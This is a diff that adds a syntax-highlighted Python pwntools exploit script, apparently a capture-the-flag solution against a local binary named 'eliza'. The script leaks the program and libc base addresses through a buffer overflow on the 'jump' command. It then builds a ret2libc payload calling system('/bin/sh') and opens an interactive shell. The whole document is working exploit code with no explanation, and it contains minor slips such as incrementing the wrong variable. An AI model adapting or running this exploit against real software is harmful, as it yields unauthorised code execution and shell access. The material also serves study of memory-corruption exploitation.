@@ -1,0 +1,59 @@
+<div class="highlight"><pre><span class="c">#!/usr/bin/python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span> <span class="n">arch</span><span class="o">=</span><span class="s">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s">&#39;info&#39;</span><span class="p">)</span>
+
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./eliza&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;help&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;info eliza&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;Designation Number: &#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+<span class="n">base</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x4cc7</span>
+<span class="k">print</span> <span class="s">&#39;elf base: &#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>
+
+
+<span class="n">data_section</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x976c</span>
+<span class="k">print</span> <span class="s">&#39;data: &#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>
+<span class="k">while</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span> <span class="ow">in</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_section</span><span class="p">):</span>
+	<span class="n">data</span> <span class="o">+=</span> <span class="mi">1</span>
+<span class="k">print</span> <span class="s">&#39;data_section: &#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>
+<span class="n">add_esp_c</span> <span class="o">=</span> <span class="mh">0x00001a29</span>
+<span class="n">write_plt</span> <span class="o">=</span> <span class="mh">0xf90</span>
+<span class="n">got</span> <span class="o">=</span> <span class="mh">0x904c</span>
+
+
+<span class="n">payload</span>  <span class="o">=</span> <span class="s">&#39;&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;jump &#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;c&#39;</span><span class="o">*</span><span class="mh">0x20c</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="mh">0x1580</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="mh">0x1040</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">got</span><span class="p">)</span>
+<span class="k">assert</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">payload</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span> <span class="n">payload</span> <span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&#39;</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;Wel&#39;</span><span class="p">)</span>
+<span class="n">__libc_start_main</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">21</span><span class="p">:</span><span class="mi">25</span><span class="p">])</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">__libc_start_main</span> <span class="o">-</span> <span class="mi">99232</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mi">241312</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mi">1436281</span>
+<span class="k">assert</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+<span class="k">assert</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">p32</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+<span class="k">print</span> <span class="s">&#39;libc_base: &#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+<span class="k">print</span> <span class="s">&#39;system: &#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+<span class="k">print</span> <span class="s">&#39;sh: &#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+
+<span class="n">payload</span>  <span class="o">=</span> <span class="s">&#39;&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;jump &#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;c&#39;</span><span class="o">*</span><span class="mh">0x20c</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="mh">0x1040</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+<span class="k">assert</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">payload</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span> <span class="n">payload</span> <span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
